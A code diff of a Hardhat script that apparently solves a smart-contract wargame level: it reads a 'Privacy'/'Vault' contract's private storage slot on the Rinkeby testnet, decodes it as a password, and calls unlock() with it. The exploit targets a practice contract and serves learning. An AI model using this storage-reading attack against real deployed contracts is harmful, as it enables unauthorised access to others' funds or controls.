@@ -4,18 +4,18 @@ const provider = new hre.ethers.providers.JsonRpcProvider( process.env.RINKEBY_U
 const wallet = new hre.ethers.Wallet( process.env.PRIVATE_KEY, provider );
 
 const main = async () => {
-  const vaultAbi = await hre.artifacts.readArtifact("Privacy");
-  const vaultContract = await new hre.ethers.Contract("0x7Ca9Ffa0792BD500fFaCD04108eB0DCd58Da4432", vaultAbi.abi, wallet);
-  console.log("Delegate contract: " + vaultContract.address);
+  const privacyAbi = await hre.artifacts.readArtifact("Privacy");
+  const privacyContract = await new hre.ethers.Contract("0xFece0f9e85D38AD3092C2a9Fd7b12d6fe449A86E", privacyAbi.abi, wallet);
+  console.log("Delegate contract: " + privacyContract.address);
 
-  let txn1 = await provider.getStorageAt(vaultContract.address, 1);
+  let txn1 = await provider.getStorageAt(privacyContract.address, 1);
   console.log(`Password aquired: ${(hre.ethers.utils.toUtf8String(txn1))}`);
 
 
   let password = hre.ethers.utils.toUtf8String(txn1)
   console.log("Password stored")
 
-  let txn2 = await vaultContract.unlock(txn1);
+  let txn2 = await privacyContract.unlock(txn1);
   console.log("Unlocking...")
   await txn2.wait();
   console.log("Vault unlocked.")
